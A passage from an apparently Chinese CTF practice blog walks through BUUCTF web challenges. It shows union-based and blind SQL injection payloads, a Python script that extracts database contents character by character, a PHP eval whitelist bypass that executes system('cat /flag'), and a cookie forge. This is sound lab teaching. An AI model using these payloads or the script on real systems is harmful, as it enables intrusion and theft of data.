class="line">1&#x27;/**/union/**/select/**/1,(group_concat(table_name)),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=&quot;web1&quot;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b15.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b15.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>得到表名为 ads 和 users，但是 information_schema 不能使用，这里就要用到无字段名爆值，学习链接：<a href="https://blog.csdn.net/m0_46230316/article/details/106668182">https://blog.csdn.net/m0_46230316/article/details/106668182</a></p><p>在尝试之后得到 flag 在 users 表的第三列</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/1,database(),(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><br></pre></td></tr></table></figure><p><code>select group_concat(b)</code>  就是查询 users 表第三列。</p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b16.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b16.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>得到 flag</p><h2 id="ciscn-2019-初赛love-math"><a class="markdownIt-Anchor" href="#ciscn-2019-初赛love-math">#</a> [CISCN 2019 初赛] Love Math</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br></pre></td></tr></table></figure><p>这个白名单很关键，因为里面有一些解码函数，可以用来绕过一些过滤</p><p>另外，知识点 php 中可以把函数名通过字符串的方式传递给一个变量，通过此变量动态调用函数比如下面的代码会执行 <code>system('cat /flag')</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a=&#x27;system&#x27;;</span><br><span class="line">$a(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure><p>本题使用的传参是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=($_GET[a])($_GET[b])&amp;a=system&amp;b=cat /flag</span><br></pre></td></tr></table></figure><p>但是 <code>_GET</code> 、 <code>a</code>  和 <code>b</code>  不在白名单会被过滤，这里先把 a 和 b 替换成存在白名单的参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=($_GET[pi])($_GET[abs])&amp;pi=system&amp;abs=cat /flag</span><br></pre></td></tr></table></figure><p>但是这里的_GET 没有办法替换，并且 <code>[]</code>  在黑名单里面</p><p>这就要去白名单里面找找能用的函数</p><p>先记录一下如何转换 <code>_GET</code></p><p>1、 <code>hex2bin()</code>  函数</p><p>hex2bin 函数把十六进制值的字符串转换为 ASCII 字符。</p><p>这里 <code>_GET</code>  是 ASCII 字符，先转成十六进制</p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b17.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b17.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><code>5f474554</code></p><p>hex2bin (‘5f474554’) 就是 <code>_GET</code></p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b18.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b18.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>但是 hex2bin (5f474554) 也全都不在白名单，所以也不可以直接用，会被下面的函数检测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match_all(&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;, $content, $used_funcs);  </span><br></pre></td></tr></table></figure><p><code>base_convert()</code>  函数在任意进制之间转换数字。</p><p>在各个进制中可以看到 36 进制是数字 + 小写字母，所以 hex2bin 可以当作 36 进制利用 <code>base_convert()</code>  十进制转 36 进制可以的刀函数 <code>hex2bin</code></p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b19.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b19.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>得到 hex2bin 的 10 进制为 37907361743，贴个网站 https://tool.lu/hexconvert/</p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b20.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b20.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="b20"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)<span class="comment">#hex2bin</span></span><br></pre></td></tr></table></figure><p>所以组合一下<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mrow></mrow><mi>G</mi></msub><mi>E</mi><mi>T</mi><mo stretchy="false">(</mo><mo stretchy="false">)</mo><mtext>就是</mtext><mi mathvariant="normal">‘</mi></mrow><annotation encoding="application/x-tex">_GET()就是`</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">G</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mclose">)</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span><span class="mord">‘</span></span></span></span>base_convert(37907361743,10,36)(dechex(1598506324)) <code>，</code> dechex(1598506324) <code>就是</code>  5f474554`</p><p><code>[]</code>  被禁用可以用 <code>&#123;&#125;</code>  替代，所以构建 payload，先让 <code>$pi=$base_convert(37907361743,10,36)(dechex(1598506324))</code> ，让 pi 的值为 <code>_GET</code> ，然后 ($$pi) 就是 $_GET，{} 替代 []</p><p>得到 payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi=system&amp;abs=cat /flag</span><br></pre></td></tr></table></figure><p>过滤只会对参数 c 过滤，pi 参数和 abs 参数躲开了函数的过滤</p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b21.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b21.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p ed2df005-26ae-44b7-aac3-7ecd017a230d>拿到 flag，flag</p><h2 id="极客大挑战-2019finalsql"><a class="markdownIt-Anchor" href="#极客大挑战-2019finalsql">#</a> [极客大挑战 2019] FinalSQL</h2><p>进入页面，选择神秘代码即可获得 flag，一个个看过去，看看能不能获得什么有用的信息，第五个说怎么看第六个，前五个页面是根据 id 的，直接让 id=6</p><p><code>Clever! But not this table.</code></p><p>不在这个表</p><p>注入点应该就是在 id，这里过滤了很多东西 union select 和报错注入的函数都被禁用了</p><p>判断一下是数字型注入还是字符型注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1^1</span><br><span class="line">?id=1^0</span><br><span class="line"># 1^1=0,0^0=0,1^0=1</span><br></pre></td></tr></table></figure><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/c1.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/c1.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/c2.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/c2.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>是数字型，构造 payload 盲注</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/search.php?id=1^(ascii(substr((select(group_concat(database()))),1,1))&gt;0)^1#获取当前数据库名称</span><br><span class="line">/search.php?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))&gt;0)^1#爆表</span><br><span class="line">以此类推</span><br></pre></td></tr></table></figure><p><code>1^...^1</code> : 这里使用异或运算对结果进行处理，异或一个固定值两次不会改变它的值。</p><p>写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://41bb05d0-bf55-4f82-9280-8e1aa6a0da1d.node5.buuoj.cn:81/search.php?id=&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    begin = <span class="number">32</span>  <span class="comment">#ASCII可打印字符开始</span></span><br><span class="line">    end = <span class="number">126</span></span><br><span class="line">    mid = (begin + end) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> begin &lt; end:</span><br><span class="line">        time.sleep(<span class="number">0.06</span>)</span><br><span class="line">        <span class="comment"># 爆库</span></span><br><span class="line">        <span class="comment"># payload = &quot;1^(ascii(substr((select(group_concat(database()))),%d,1))&gt;%d)^1&quot; % (i, mid)</span></span><br><span class="line">        <span class="comment"># 爆表</span></span><br><span class="line">        <span class="comment"># payload = &quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%d)^1&quot; % (i, mid)</span></span><br><span class="line">        <span class="comment"># 爆字段</span></span><br><span class="line">        <span class="comment"># payload = &quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;geek&#x27;)),%d,1))&gt;%d)^1&quot; %(i,mid)</span></span><br><span class="line">        <span class="comment"># 获取内容（flag）</span></span><br><span class="line">        <span class="comment"># payload = &quot;1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot; %(i,mid)</span></span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Click&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            begin = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = mid</span><br><span class="line">        mid = (begin + end) // <span class="number">2</span></span><br><span class="line">    </span><br><span class="line">    flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">if</span> begin == <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>最后得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">当前数据库：</span><br><span class="line">geek</span><br><span class="line">表名：</span><br><span class="line">F1naI1y,Flaaaaag</span><br><span class="line">字段名：</span><br><span class="line">id,username,password,id,fl4gawsl</span><br><span class="line">按表爆内容（F1naI1y爆完就得到了）：</span><br><span class="line">cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;b8a4fbab-f13a-4ebe-a455-3256d476d6b0&#125;</span><br></pre></td></tr></table></figure><h2 id="bsidescf-2019kookie"><a class="markdownIt-Anchor" href="#bsidescf-2019kookie">#</a> [BSidesCF 2019]Kookie</h2><p>本题的题目头和 Cookie 关联很大，点进去一看，登录，Login as admin，那就猜测构造 Cookie 登录</p><p>抓包，添加 Cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: username=admin</span><br></pre></td></tr></table></figure><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/c3.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/c3.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p e7a6c0e0-7b25-4e36-b341-6469821d6432>得到 flag，flag</p><h2 id="bsidescf-2019futurella"><a class="markdownIt-Anchor" href="#bsidescf-2019futurella">#</a> [BSidesCF 2019]Futurella</h2><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/c4.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/c4.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>记录一下这个文字，很奇怪直接选择这个花括号的内容复制粘贴就是 flag 了，f12 也可以直接查看</p><p 887cf646-23c0-4542-aed9-dce48e0b9db3>flag</p><h2 id="de1ctf-2019ssrf-me"><a class="markdownIt-Anchor" href="#de1ctf-2019ssrf-me">#</a> [De1CTF 2019]SSRF Me</h2><p>打开看到代码，整理得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)<span class="comment">#置默认的string的编码格式</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span><br><span class="line">        <span class="variable language_">self</span>.action = action</span><br><span class="line">        <span class="variable language_">self</span>.param = param</span><br><span class="line">        <span class="variable language_">self</span>.sign = sign</span><br><span class="line">        <span class="variable language_">self</span>.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(<span class="variable language_">self</span>.sandbox)):</span><br><span class="line">            <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(<span class="variable language_">self</span>.sandbox)</span><br><span class="line">     <span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">self</span>.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> <span class="variable language_">self</span>.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % <span class="variable language_">self</span>.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(<span class="variable language_">self</span>.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> <span class="variable language_">self</span>.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % <span class="variable language_">self</span>.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span 